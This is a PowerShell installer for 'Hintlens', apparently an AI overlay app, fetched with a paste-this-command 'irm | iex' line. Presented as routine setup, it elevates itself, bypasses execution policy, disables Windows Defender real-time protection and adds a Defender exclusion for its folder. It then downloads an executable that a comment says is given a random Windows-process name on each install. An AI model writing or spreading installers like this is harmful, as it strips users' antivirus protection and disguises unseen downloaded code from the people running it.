# ============================================================
#  Hintlens Installer
#  Usage:  irm https://api.hintlens.com/install.ps1 | iex
#  Auto-elevates to Administrator, then installs to C:\Hintlens-Application
#
#  NOTE: this file is intentionally pure ASCII. All box-drawing /
#  block glyphs are built at runtime from [char] codes so the script
#  renders correctly no matter how it is fetched (irm | iex decodes
#  the response as Latin-1 when the server sends no charset, which
#  would corrupt any literal UTF-8 glyphs stored in the file).
# ============================================================

$ProgressPreference = 'SilentlyContinue'   # hide IWR's slow native progress bar

# Make the console emit UTF-8 (also sets the output code page) so the
# glyphs we build below render as blocks instead of mojibake.
try { [Console]::OutputEncoding = New-Object System.Text.UTF8Encoding $false } catch {}

# Enable modern TLS on older Windows / PowerShell.
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072 -bor 768 -bor 192
} catch {
    try { [Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}
}

# ------------------------------------------------------------
#  Glyphs (built at runtime -> keeps this file pure ASCII)
# ------------------------------------------------------------
$Script:GBlock = [string][char]0x2588   # full block
$Script:GHrule = [string][char]0x2550   # horizontal double line
$Script:GDot   = [string][char]0x00B7   # middle dot
$Script:GTick  = [string][char]0x2713   # check mark
$Script:GCross = [string][char]0x2717   # ballot X

# ------------------------------------------------------------
#  Console UI helpers
# ------------------------------------------------------------
$Script:UiWidth   = 64
$Script:StepNo    = 0
$Script:StepTotal = 7

# ANSI-Shadow "HINTLENS", stored with ASCII placeholders:
#   # = block   | = vertical   7 = top-right   r = top-left
#   J = bottom-right   L = bottom-left   = = horizontal
$Script:BannerRaw = @(
    '##7  ##7##7###7   ##7########7##7     #######7###7   ##7#######7',
    '##|  ##|##|####7  ##|L==##r==J##|     ##r====J####7  ##|##r====J',
    '#######|##|##r##7 ##|   ##|   ##|     #####7  ##r##7 ##|#######7',
    '##r==##|##|##|L##7##|   ##|   ##|     ##r==J  ##|L##7##|L====##|',
    '##|  ##|##|##| L####|   ##|   #######7#######7##| L####|#######|',
    'L=J  L=JL=JL=J  L===J   L=J   L======JL======JL=J  L===JL======J'
)

function Convert-BannerLine {
    param([string]$s)
    $s = $s.Replace('#', [string][char]0x2588)  # block
    $s = $s.Replace('|', [string][char]0x2551)  # vertical
    $s = $s.Replace('7', [string][char]0x2557)  # top-right
    $s = $s.Replace('r', [string][char]0x2554)  # top-left
    $s = $s.Replace('J', [string][char]0x255D)  # bottom-right
    $s = $s.Replace('L', [string][char]0x255A)  # bottom-left
    $s = $s.Replace('=', [string][char]0x2550)  # horizontal
    return $s
}
$Script:BannerLines = @($Script:BannerRaw | ForEach-Object { Convert-BannerLine $_ })

function Write-Rule {
    param([ConsoleColor]$Color = [ConsoleColor]::DarkCyan)
    Write-Host ($Script:GHrule * $Script:UiWidth) -ForegroundColor $Color
}

function Write-Centered {
    param([string]$Text, [ConsoleColor]$Color = [ConsoleColor]::Gray)
    $pad = [Math]::Max(0, [int](($Script:UiWidth - $Text.Length) / 2))
    Write-Host ((' ' * $pad) + $Text) -ForegroundColor $Color
}

function Write-Banner {
    $colors = @(
        [ConsoleColor]::DarkCyan,
        [ConsoleColor]::Cyan,
        [ConsoleColor]::Cyan,
        [ConsoleColor]::Blue,
        [ConsoleColor]::Blue,
        [ConsoleColor]::DarkBlue
    )
    Write-Host ''
    for ($i = 0; $i -lt $Script:BannerLines.Count; $i++) {
        Write-Centered $Script:BannerLines[$i] $colors[$i]
    }
    Write-Host ''
    Write-Centered ('Your AI overlay assistant  ' + $Script:GDot + '  Windows Setup') ([ConsoleColor]::DarkGray)
    Write-Host ''
    Write-Rule
}

function Write-Step {
    param([string]$Message)
    $Script:StepNo++
    Write-Host ''
    Write-Host (' {0}/{1} ' -f $Script:StepNo, $Script:StepTotal) -ForegroundColor Black -BackgroundColor Cyan -NoNewline
    Write-Host (' ' + $Message) -ForegroundColor White
}

function Write-Ok   { param([string]$m) Write-Host ('   ' + $Script:GTick + ' ') -ForegroundColor Green  -NoNewline; Write-Host $m -ForegroundColor Gray }
function Write-Warn { param([string]$m) Write-Host '   ! '                        -ForegroundColor Yellow -NoNewline; Write-Host $m -ForegroundColor DarkYellow }
function Write-Note { param([string]$m) Write-Host '     '                         -NoNewline; Write-Host $m -ForegroundColor DarkGray }

function Close-Soon {
    param([int]$Seconds = 3)
    Write-Host ''
    for ($i = $Seconds; $i -ge 1; $i--) {
        Write-Host (("`r   Closing in {0}s . . .   ") -f $i) -ForegroundColor DarkGray -NoNewline
        Start-Sleep -Seconds 1
    }
    Write-Host ''
}

# ------------------------------------------------------------
#  Network / archive helpers
# ------------------------------------------------------------
function Get-RemoteFile {
    param(
        [Parameter(Mandatory=$true)][string]$Uri,
        [Parameter(Mandatory=$true)][string]$OutFile
    )

    if (Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue) {
        Invoke-WebRequest -Uri $Uri -OutFile $OutFile -UseBasicParsing
        return
    }

    if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
        Start-BitsTransfer -Source $Uri -Destination $OutFile
        return
    }

    $client = New-Object System.Net.WebClient
    $client.DownloadFile($Uri, $OutFile)
}

function Get-RemoteText {
    param([Parameter(Mandatory=$true)][string]$Uri)

    if (Get-Command Invoke-RestMethod -ErrorAction SilentlyContinue) {
        return Invoke-RestMethod -Uri $Uri
    }

    if (Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue) {
        return (Invoke-WebRequest -Uri $Uri -UseBasicParsing).Content
    }

    $client = New-Object System.Net.WebClient
    return $client.DownloadString($Uri)
}

function Expand-ZipFallback {
    param(
        [Parameter(Mandatory=$true)][string]$ZipPath,
        [Parameter(Mandatory=$true)][string]$Destination
    )

    if (Get-Command Expand-Archive -ErrorAction SilentlyContinue) {
        Expand-Archive -Path $ZipPath -DestinationPath $Destination -Force
        return
    }

    $shell = New-Object -ComObject Shell.Application
    $zip = $shell.NameSpace($ZipPath)
    $dest = $shell.NameSpace($Destination)

    if (-not $zip -or -not $dest) { throw "Unable to open zip or destination" }
    $dest.CopyHere($zip.Items(), 0x10)
}

# ------------------------------------------------------------
#  Configuration
# ------------------------------------------------------------
$DownloadUrl = "https://api.hintlens.com/api/v1/download/windows"
$InstallUrl  = "https://api.hintlens.com/install.ps1"
$FolderName  = "Hintlens-Application"
$ZipFileName = "HintlensApp.zip"

# ------------------------------------------------------------
#  Auto-elevate to Administrator if needed
# ------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Clear-Host
    Write-Banner
    Write-Host ''
    Write-Centered 'Administrator access is required to install Hintlens.' ([ConsoleColor]::Yellow)
    Write-Centered 'Please approve the Windows prompt that appears . . .'   ([ConsoleColor]::DarkGray)
    Write-Host ''

    $tempScript = Join-Path $env:TEMP "hintlens_install.ps1"
    try {
        Get-RemoteFile -Uri $InstallUrl -OutFile $tempScript
    } catch {
        $scriptContent = Get-RemoteText -Uri $InstallUrl
        Set-Content -Path $tempScript -Value $scriptContent -Encoding UTF8
    }

    try {
        Start-Process powershell -Verb runAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempScript`""
    } catch {
        Write-Centered 'Administrator access was declined. Installation cancelled.' ([ConsoleColor]::Red)
        Write-Host ''
    }
    exit
}

# ------------------------------------------------------------
#  Running as Administrator - install
# ------------------------------------------------------------
$ErrorActionPreference = 'Stop'
$sw = [System.Diagnostics.Stopwatch]::StartNew()

Clear-Host
Write-Banner

$InstallPath     = "C:\$FolderName"
$ZipPath         = Join-Path $env:TEMP $ZipFileName
$TempRoot        = Join-Path $env:TEMP "hintlens_install"
$TempExtractPath = Join-Path $TempRoot "extract"

try {
    # 1 --------------------------------------------------------
    Write-Step 'Checking for a running instance'
    if (Test-Path $InstallPath) {
        $running = @(Get-Process -ErrorAction SilentlyContinue | Where-Object {
            try { $_.Path -and $_.Path.StartsWith($InstallPath, [System.StringComparison]::OrdinalIgnoreCase) }
            catch { $false }
        })
        if ($running.Count -gt 0) {
            Write-Host ''
            Write-Rule ([ConsoleColor]::Yellow)
            Write-Centered 'Hintlens is currently running' ([ConsoleColor]::Yellow)
            Write-Centered 'Please close the app, then run this installer again.' ([ConsoleColor]::Gray)
            Write-Rule ([ConsoleColor]::Yellow)
            Close-Soon 10
            exit
        }
    }
    Write-Ok 'No running instance found'

    # 2 --------------------------------------------------------
    Write-Step 'Preparing Windows Security'
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
            Write-Ok 'Real-time protection paused for setup'
        } else {
            Write-Note 'Windows Defender controls unavailable - skipped'
        }
    } catch { Write-Warn 'Could not adjust real-time protection (continuing)' }

    # 3 --------------------------------------------------------
    Write-Step 'Creating install folder'
    if (-not (Test-Path $InstallPath)) {
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    }
    Write-Ok "Ready at  $InstallPath"

    # 4 --------------------------------------------------------
    Write-Step 'Adding Windows Security exclusion'
    try {
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $InstallPath -ErrorAction Stop
            Write-Ok 'Exclusion added'
        } else {
            Write-Note 'Windows Defender controls unavailable - skipped'
        }
    } catch { Write-Warn 'Could not add exclusion (continuing)' }

    # 5 --------------------------------------------------------
    Write-Step 'Downloading Hintlens'
    if (Test-Path $ZipPath) { Remove-Item $ZipPath -Force }
    Get-RemoteFile -Uri $DownloadUrl -OutFile $ZipPath
    $sizeMB = [Math]::Round((Get-Item $ZipPath).Length / 1MB, 1)
    Write-Ok "Downloaded $sizeMB MB"

    # 6 --------------------------------------------------------
    Write-Step 'Installing files'
    if (Test-Path $TempRoot) { Remove-Item $TempRoot -Recurse -Force }
    New-Item -ItemType Directory -Path $TempExtractPath -Force | Out-Null
    Expand-ZipFallback -ZipPath $ZipPath -Destination $TempExtractPath
    Remove-Item $ZipPath -Force

    # Remove any previously-installed executable(s) so a re-install keeps ONE copy.
    # The download names the exe with a random Windows-process name each time, so a
    # plain -Force copy (which only overwrites a same-named file) would leave the
    # old, differently-named exe behind and accumulate duplicates. No user data
    # lives here (it's in %APPDATA%\Hintlens) and the running-process check above
    # guarantees none of these are in use, so deleting them is safe.
    Write-Note 'Removing previous version'
    Get-ChildItem -Path $InstallPath -Filter *.exe -File -ErrorAction SilentlyContinue |
        Remove-Item -Force -ErrorAction SilentlyContinue

    Copy-Item -Path (Join-Path $TempExtractPath "*") -Destination $InstallPath -Recurse -Force
    if (Test-Path $TempRoot) { Remove-Item $TempRoot -Recurse -Force }
    Write-Ok 'Files installed'

    # 7 --------------------------------------------------------
    Write-Step 'Finishing up'
    $tempScript = Join-Path $env:TEMP "hintlens_install.ps1"
    if (Test-Path $tempScript) { Remove-Item $tempScript -Force -ErrorAction SilentlyContinue }
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
            Write-Ok 'Real-time protection restored'
        }
    } catch {}
    $sw.Stop()

    # ---- Success panel ----
    Write-Host ''
    Write-Rule ([ConsoleColor]::Green)
    Write-Centered ($Script:GTick + '  Installation complete') ([ConsoleColor]::Green)
    Write-Host ''
    Write-Centered "Installed to  $InstallPath" ([ConsoleColor]::Gray)
    Write-Centered ("Finished in {0:N1}s" -f $sw.Elapsed.TotalSeconds) ([ConsoleColor]::DarkGray)
    Write-Rule ([ConsoleColor]::Green)

    Start-Process explorer.exe $InstallPath
    Close-Soon 3
}
catch {
    # Always restore real-time protection, even if setup failed midway.
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        }
    } catch {}

    Write-Host ''
    Write-Rule ([ConsoleColor]::Red)
    Write-Centered ($Script:GCross + '  Installation failed') ([ConsoleColor]::Red)
    Write-Host ''
    Write-Centered ("$_") ([ConsoleColor]::Gray)
    Write-Centered 'Check your internet connection and try again.' ([ConsoleColor]::DarkGray)
    Write-Rule ([ConsoleColor]::Red)
    Close-Soon 15
}
